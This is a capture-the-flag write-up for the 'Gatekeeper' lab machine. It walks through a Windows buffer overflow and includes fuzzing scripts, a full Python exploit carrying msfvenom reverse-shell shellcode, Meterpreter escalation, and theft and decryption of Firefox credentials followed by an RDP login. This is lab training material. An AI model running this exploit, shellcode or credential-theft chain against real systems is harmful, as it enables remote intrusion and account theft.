---
layout: default
title : muzec - Gatekeeper(Buffer Overflow) Writeup
---

![image](https://imgur.com/v4Q1ays.png)


Before going deep probably you will need a Buffer Overflow cheat sheet i put together to help out in any buffer overflow box you can easily grab it here [Buffer Overflow cheat sheet](https://muzec0318.github.io/posts/BufferOverflow.html)

Now let hit it with a Nmap scan first;

```
# Nmap 7.91 scan initiated Sat Apr 10 12:01:47 2021 as: nmap -sC -sV -oA nmap 10.10.178.221
Nmap scan report for 10.10.178.221
Host is up (0.17s latency).
Not shown: 988 closed ports
PORT      STATE    SERVICE            VERSION
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open     ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2021-04-09T18:29:19
|_Not valid after:  2021-10-09T18:29:19
|_ssl-date: 2021-04-10T19:06:22+00:00; +3h00m02s from scanner time.
6901/tcp  filtered jetstream
31337/tcp open     Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49155/tcp open     msrpc              Microsoft Windows RPC
49161/tcp open     msrpc              Microsoft Windows RPC
49165/tcp open     msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=4/10%Time=6071CC4A%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r
SF:(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:nm@n
SF:m>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-ID:
SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
SF:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
SF:20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(HTT
SF:POptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
SF:r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x20\
SF:x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSSess
SF:ionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(Fou
SF:rOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x01de
SF:fault!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!\n"
SF:);
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h00m02s, deviation: 2h00m00s, median: 3h00m01s
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:a2:bd:38:40:d1 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-10T15:06:07-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-10T19:06:07
|_  start_date: 2021-04-10T18:29:06

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 10 12:06:20 2021 -- 1 IP address (1 host up) scanned in 273.40 seconds

```

Lol some really cool ports i can see but let hit the SMB first to check if we have anonymous logins access to the smb share.

`smbclient -L //IP/ -N`   Listing our the available shares

![image](https://imgur.com/3mGA1vb.png)

Cool guess we have access to the `Users` share let check it out.

`smbclient  //IP/Users -N`  Access in share boom anonymous logins allowed.

![image](https://imgur.com/Ikr7rfV.png)

ahhhhh a window executable file cool let transfer it to our window machine for normal inspecting.

![image](https://imgur.com/LoADpSM.png)

Looking cool on our window machine but i run into a problem the executable file refuse to run i keep getting `VCRUNTIME140.DLL` is missing but i was able to fix that by downloading another `VCRUNTIME140.DLL` on `https://www.dll-files.com/vcruntime140.dll.html` if you have that already i think we are good to go.

Now let open the gatekeeper.exe with Immunity Debugger.

![image](https://imgur.com/1nKbBhb.png)

If you are using my cheat sheet the first thing to do is to make sure shell connection is active, test the fuction for buffer storing.

`nc <target_ip> <port>`   Now the target IP we be my window IP since am running the gatekeeper.exe for testing and the port is `31337` found it in the ports scan.


![image](https://imgur.com/oGIDSJB.png)

Now let go back to the window to check what is going on under the hood lol.

![image](https://imgur.com/35OTIAs.png)

Cool it receiving our input now let try to fuzzer it.

### FUZZING

```

#!/usr/bin/python

# Save to a file with name Fuzzer.py

import socket
import sys

# setup the Target's IP and port to the target.
RHOST = "172.16.139.133"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload Sending 1000 A's
payload = "A"*1000

# build a happy little message followed by a newline
buf = ""
buf += payload
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```

![Image](https://imgur.com/GsmF4Kz.png)

Now let check the window to see what is going on.

![image](https://imgur.com/y4SAiZP.png)

Ahhhhh we got a crashed oh yes it definitely Buffer Overflow now let restart immunity debugger again and open the gatekeeper.exe again.

Now let create some pattern with `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1001` screenshot below;

![image](https://imgur.com/ZtKjSkH.png)

Yes it should be like that now let edit our script below with it.

```

#!/usr/bin/python


import socket
import sys

RHOST = "172.16.139.133"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# The payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh"

# build a happy little message followed by a newline
buf = ""
buf += payload
buf += "\n"


# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```

Now let run it.

![image](https://imgur.com/AUS3nwh.png)

Now going back to the window we got a crashed again but now the EIP got changed we can use that to find the offset number.

![image](https://imgur.com/jLdF4yM.png)

### FINDING OFFSET NOW;-

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138`  with the new EIP number we got from the crashed

![Image](https://imgur.com/HBSYXX7.png)

Another script again with the offset number.
```
#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "172.16.139.133"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 146

# build a happy little message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))     # padding
buf += "BBBB"                          # SRP overwrite
buf += "CCCC"                          # ESP should end up pointing here
buf += "D"*(buf_totlen - len(buf))     # trailing padding
buf += "\n"

# send the happy little message down the socket
s.send(buf)

# print out what we send
print "Sent: {0}".format(buf)

# receive some data from the socket
data = s.recv(1024)

# print out what we received
print "Received: {0}".format(data)
```
![image](https://imgur.com/3iWepGY.png)

Cool we overwrite the EIP which mean we have total control over the EIP now.

### FINDING BAD CHARACTERS

Let create a working directory first;-

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00\x0a"
```
![Image](https://imgur.com/FooTA5J.png)

![image](https://imgur.com/lVvvclz.png)

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff;

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

![Image](https://imgur.com/bCOpu79.png)

```
#!/usr/bin/env python2
import socket

RHOST = "172.16.139.133"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A" * 146 + "BBBB" + "C" * 10
buf += (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buf += "\n"

s.send(buf)
```


![image](https://imgur.com/zan5qmY.png)

`!mona compare -f C:\mona\gatekeeper\bytearray.bin -a < ESP-address>`  with the ESP number we got from the crashed now.

![Image](https://imgur.com/TrjklJ6.png)

![image](https://imgur.com/wa5W3Pe.png)

`Only 1 original bytes of normal code found`

A popup window should appear labelled “mona Memory comparison results”. If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others.

NOTE:- according to some research i do `"\0a"` is also a bad character.

### FINDING A JUMP POINT:-

`!mona jmp -r esp -cpb "\x00\0a"`

![image](https://imgur.com/HlO1vhI.png)

Cool we found 2 pointers and the this command finds all “jmp esp” (or equivalent) instructions with addresses that don’t contain any of the badchars specified.

Now let pick one the pointer `080414c3` now what we have to do is to write it backward (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

### GENERATE PAYLOAD:-

`msfvenom -p windows/shell_reverse_tcp LHOST=IP-Adress LPORT=4444 -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "\x00\x0a"`

![Image](https://imgur.com/03rH3SF.png)

```
#!/usr/bin/env python

# usage python exploit.py <targetIP> <targetPort>

import sys, socket

rhost = sys.argv[1]
rport = int(sys.argv[2])

# msfvenom -p windows/shell_reverse_tcp LHOST=IP_address LPORT=4444 -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "\x00\x0a"

shellcode = ("\xbb\x38\xd6\x3e\xe5\xda\xc4\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x5a\x12\x03\x5a\x12\x83\xfa\xd2\xdc\x10\x06\x32\xa2"
"\xdb\xf6\xc3\xc3\x52\x13\xf2\xc3\x01\x50\xa5\xf3\x42\x34\x4a"
"\x7f\x06\xac\xd9\x0d\x8f\xc3\x6a\xbb\xe9\xea\x6b\x90\xca\x6d"
"\xe8\xeb\x1e\x4d\xd1\x23\x53\x8c\x16\x59\x9e\xdc\xcf\x15\x0d"
"\xf0\x64\x63\x8e\x7b\x36\x65\x96\x98\x8f\x84\xb7\x0f\x9b\xde"
"\x17\xae\x48\x6b\x1e\xa8\x8d\x56\xe8\x43\x65\x2c\xeb\x85\xb7"
"\xcd\x40\xe8\x77\x3c\x98\x2d\xbf\xdf\xef\x47\xc3\x62\xe8\x9c"
"\xb9\xb8\x7d\x06\x19\x4a\x25\xe2\x9b\x9f\xb0\x61\x97\x54\xb6"
"\x2d\xb4\x6b\x1b\x46\xc0\xe0\x9a\x88\x40\xb2\xb8\x0c\x08\x60"
"\xa0\x15\xf4\xc7\xdd\x45\x57\xb7\x7b\x0e\x7a\xac\xf1\x4d\x13"
"\x01\x38\x6d\xe3\x0d\x4b\x1e\xd1\x92\xe7\x88\x59\x5a\x2e\x4f"
"\x9d\x71\x96\xdf\x60\x7a\xe7\xf6\xa6\x2e\xb7\x60\x0e\x4f\x5c"
"\x70\xaf\x9a\xf3\x20\x1f\x75\xb4\x90\xdf\x25\x5c\xfa\xef\x1a"
"\x7c\x05\x3a\x33\x17\xfc\xad\x90\xfc\xf4\x29\x81\xfe\x08\x23"
"\x0d\x76\xee\x29\xbd\xde\xb9\xc5\x24\x7b\x31\x77\xa8\x51\x3c"
"\xb7\x22\x56\xc1\x76\xc3\x13\xd1\xef\x23\x6e\x8b\xa6\x3c\x44"
"\xa3\x25\xae\x03\x33\x23\xd3\x9b\x64\x64\x25\xd2\xe0\x98\x1c"
"\x4c\x16\x61\xf8\xb7\x92\xbe\x39\x39\x1b\x32\x05\x1d\x0b\x8a"
"\x86\x19\x7f\x42\xd1\xf7\x29\x24\x8b\xb9\x83\xfe\x60\x10\x43"
"\x86\x4a\xa3\x15\x87\x86\x55\xf9\x36\x7f\x20\x06\xf6\x17\xa4"
"\x7f\xea\x87\x4b\xaa\xae\xb8\x01\xf6\x87\x50\xcc\x63\x9a\x3c"
"\xef\x5e\xd9\x38\x6c\x6a\xa2\xbe\x6c\x1f\xa7\xfb\x2a\xcc\xd5"
"\x94\xde\xf2\x4a\x94\xca")

payload = "\x90" * 146 + "\xc3\x14\x04\x08" + "\x90" * 32 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c = s.connect((rhost, rport))
s.send(payload + '\r\n')
data = s.recv(1024)
s.close()
```

Now let start a listener with ncat and run the script if we have everything right we should get a shell back to our terminal.

![image](https://imgur.com/4ezGMnU.png)

Boom we have shell now what we have to do is to edit it to our target IP now.

![Image](https://imgur.com/ssIdedp.png)

Finally we have access to the machine shit am tired lol. so i spend time on getting the root but i got no luck so i check on write up to see what am missing so i try doing it again.


### TRANSFER SHELL TO METASPLOIT 

![image](https://imgur.com/4os2SnV.png)

Now let run our exploit we should get a shell back.

![image](https://imgur.com/SGSy8AL.png)

Now let upgrade our shell to meterpreter shell.

`sessions -u 1`

`sessions`

`sessions 2`

![image](https://imgur.com/Lyxlm3t.png)

![image](https://imgur.com/hkivXsE.png)

I think i told you guys i was stuck here the last time before checking write up to see what am missing now i think we can see `Firefox.lnk` now let try to use one of the metasploit module `post/multi/gather/firefox_creds` to see if we can get any credentials.

![image](https://imgur.com/8GZm2l7.png)

Now let hit exploit.

![image](https://imgur.com/HQyQB2J.png)

Boom Boom So i go to my metasploit loot to rename each file `cert9.db` `cookies.sqlite` `key4.db` `logins.json` cool to the real name.

![Image](https://imgur.com/eW6Pu6G.png)

So i download Firefox Decrypt which can be used to recover passwords from a profile which is cool since we got some profile dumps also from the firefox folders also now let run our script.

`python3 firefox_decrypt.py ./` and we get the credentials.

![Image](https://imgur.com/jxAWgl5.png)

Cool we can easily use RDP to log in with the new credentials we just found.

`rdesktop IP:3389 -u mayor -p Password`

![image](https://imgur.com/EmFl7oW.png)


And we are done.... Shit i really need to brush my skills more in windows but hell yea the Buffer Overflow was fun......

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
